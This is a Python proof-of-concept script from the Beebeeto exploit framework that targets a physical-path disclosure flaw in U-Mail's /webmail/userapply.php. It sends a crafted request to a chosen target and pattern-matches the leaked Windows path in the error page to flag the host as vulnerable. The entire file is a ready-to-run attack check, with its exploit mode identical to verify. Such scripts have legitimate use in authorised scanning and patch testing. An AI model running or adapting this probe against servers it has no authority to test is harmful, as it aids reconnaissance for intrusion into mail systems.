#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0164',
            'name': 'U-Mail /webmail/userapply.php 物理路径泄漏漏洞 POC',
            'author': '雷锋',
            'create_date': '2014-11-23',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'U-Mail',
            'vul_version': '*',
            'type': 'Information Disclosure',
            'tag': ['U-Mail漏洞', '信息泄露/路径泄露', '/webmail/userapply.php', 'php'],
            'desc': '''
                    网站物理路径泄漏
                    Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource
                    in D:\ProgramFiles\umail\WorldClient\html\userapply.php on line 0
                    ''',
            'references': ['N/A',
            ]
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/webmail/userapply.php?execadd=333&DomainID=111'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        m = re.search(r'[C-Z]\:[\\\w]{0,}\\userapply.php', content)
        if m:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())